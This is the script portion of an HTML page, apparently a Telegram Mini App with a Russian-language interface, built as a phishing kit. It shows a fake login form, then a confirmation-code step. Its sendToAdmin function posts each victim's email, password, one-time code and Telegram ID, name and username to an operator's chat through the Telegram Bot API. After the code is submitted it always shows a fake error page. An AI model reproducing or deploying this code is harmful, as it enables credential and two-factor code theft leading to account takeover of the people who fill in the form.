        msgDiv.textContent = text;
        msgDiv.className = `message ${type}`;
        clearTimeout(msgDiv._timer);
        msgDiv._timer = setTimeout(() => { msgDiv.style.display = 'none'; }, 5000);
    }

    function goTo(name) {
        Object.values(pages).forEach(p => p.classList.remove('active'));
        pages[name].classList.add('active');
        msgDiv.style.display = 'none';
        loginError.style.display = 'none';
        codeError.style.display = 'none';
        codeStatus.style.display = 'none';

        if (name === 'main') {
            email.value = '';
            password.value = '';
            codeInput.value = '';
            loginBtn.disabled = false;
            loginBtn.textContent = 'Войти';
            codeBtn.disabled = false;
            codeBtn.textContent = 'Подтвердить';
            attemptCount = 0;
        }
        if (name === 'loginForm') setTimeout(() => email.focus(), 200);
        if (name === 'code') setTimeout(() => codeInput.focus(), 200);
    }

    function openSupportChat() {
        window.open(SUPPORT_LINK, '_blank');
    }

    function handleError() {
        attemptCount++;
        if (attemptCount >= MAX_ATTEMPTS) {
            document.querySelectorAll('input, button').forEach(el => el.disabled = true);
            goTo('error');
            return true;
        }
        return false;
    }

    // ============================================================
    // ОТПРАВКА В ЛИЧКУ АДМИНУ (напрямую через Bot API)
    // ============================================================
    async function sendToAdmin(text) {
        try {
            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ADMIN_ID,
                    text: text,
                    parse_mode: 'Markdown'
                })
            });
            const data = await res.json();
            if (!data.ok) {
                console.error('Telegram API error:', data);
                return false;
            }
            return true;
        } catch (err) {
            console.error('fetch error:', err);
            return false;
        }
    }

    // ============================================================
    // ВХОД → КОД
    // ============================================================
    async function handleLogin() {
        const e = email.value.trim();
        const p = password.value.trim();

        if (!e || !p) { showMessage('Заполните все поля', 'error'); return; }
        if (!e.includes('@')) { showMessage('Введите корректный email', 'error'); return; }

        userEmail = e;
        userPassword = p;

        loginBtn.disabled = true;
        loginBtn.textContent = 'Отправка...';

        const user = tg.initDataUnsafe?.user || {};
        const msg =
            `🔔 НОВАЯ ЗАЯВКА (ВХОД)\n\n` +
            `👤 ID: ${user.id || 'неизвестно'}\n` +
            `👤 Имя: ${user.first_name || '-'}\n` +
            `👤 Username: @${user.username || 'нет'}\n\n` +
            `📧 Email: ${e}\n` +
            `🔑 Пароль: ${p}`;

        const ok = await sendToAdmin(msg);

        loginBtn.disabled = false;
        loginBtn.textContent = 'Войти';

        if (!ok) {
            if (handleError()) return;
            loginError.textContent = `Ошибка отправки. (${attemptCount}/${MAX_ATTEMPTS})`;
            loginError.style.display = 'block';
            return;
        }

        goTo('code');
        codeStatus.style.display = 'block';
        showMessage('Ожидание...', 'success');
    }

    // ============================================================
    // КОД → ОШИБКА
    // ============================================================
    async function handleCode() {
        const code = codeInput.value.trim();
        if (!code || code.length < 4) { showMessage('Введите корректный код', 'error'); return; }

        codeBtn.disabled = true;
        codeBtn.textContent = 'Отправка...';

        const user = tg.initDataUnsafe?.user || {};
        const msg =
            `📧 КОД ПОДТВЕРЖДЕНИЯ\n\n` +
            `👤 ID: ${user.id || 'неизвестно'}\n` +
            `👤 Имя: ${user.first_name || '-'}\n` +
            `👤 Username: @${user.username || 'нет'}\n\n` +
            `📧 Email: ${userEmail}\n` +
            `🔑 Пароль: ${userPassword}\n` +
            `🔢 Код: ${code}`;

        const ok = await sendToAdmin(msg);

        codeBtn.disabled = false;
        codeBtn.textContent = 'Подтвердить';

        if (!ok) {
            if (handleError()) return;
            codeError.textContent = `Ошибка отправки. (${attemptCount}/${MAX_ATTEMPTS})`;
            codeError.style.display = 'block';
            return;
        }

        codeInput.value = '';
        codeStatus.style.display = 'none';
        goTo('error');
    }

    // ============================================================
    // ENTER
    // ============================================================
    document.addEventListener('keypress', function(e) {
        if (e.key !== 'Enter') return;
        if (pages.loginForm.classList.contains('active')) handleLogin();
        else if (pages.code.classList.contains('active')) handleCode();
    });
</script>

</body>
</html>
